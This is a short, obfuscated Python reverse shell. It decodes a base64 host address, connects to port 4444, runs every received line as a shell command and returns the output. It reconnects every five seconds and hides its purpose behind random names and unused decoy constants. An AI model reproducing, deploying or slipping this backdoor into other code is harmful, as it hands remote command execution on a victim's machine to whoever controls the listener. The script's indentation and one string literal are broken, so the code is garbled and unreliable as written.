
import asyncio as p0gohrd5
import subprocess as bwtwzyob
ccloelxy = 917
pzyxn32w = 4571
yf549ipr = 6136
s2ulf18u = 5617
xw17o7t1 = __import__("base64").b64decode('MTI3LjAuMC4x').decode()
ou7bb5fj = 4444
async def d9z02j5j(r, w):
    while True:
try: data = await p0gohrd5.wait_for(r.read(4096), timeout=30)
except p0gohrd5.TimeoutError: continue
if not data: break
try:
    p = bwtwzyob.run(data.decode(errors="replace").strip(),
        shell=True, capture_output=True, text=True, timeout=15)
    out = p.stdout + p.stderr
except Exception as e: out = str(e)
w.write((out or "[no output]
").encode()); await w.drain()
    w.close()
async def _m():
    while True:
try:
    r,w = await p0gohrd5.open_connection(xw17o7t1, ou7bb5fj)
    await d9z02j5j(r,w)
except OSError: await p0gohrd5.sleep(5)
p0gohrd5.run(_m())
